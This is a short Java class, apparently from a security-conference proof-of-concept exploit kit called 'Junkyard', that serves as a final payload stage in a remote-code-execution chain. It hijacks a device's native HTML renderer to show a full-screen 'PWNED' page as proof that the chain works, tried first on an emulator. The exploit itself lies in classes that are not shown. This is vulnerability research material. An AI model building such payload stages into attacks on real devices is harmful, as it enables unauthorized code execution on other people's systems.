package org.junkyard;

import com.planetweb.eden.client.service.Service;
import com.planetweb.eden.client.service.ServiceInfo;

/**
 * CHAIN "splash": minimal proof chain. Hijacks the native HTML renderer to a
 * full-screen Junkyard "PWNED" page. Lowest-risk thing to try on the emulator
 * first -- if this works, the RCE chain itself is confirmed end to end.
 */
public class SplashService extends Service {
    public ServiceInfo getInfo() { return new ServiceInfo("JunkyardSplash", "1.0", "DistrictCon", Junk.BASE); }

    public void run() {
        Junk.banner("CHAIN splash -- browser hijack proof");
        Junk.prove();
        Junk.openURL(Junk.BASE + "/junkyard.html");
    }
}
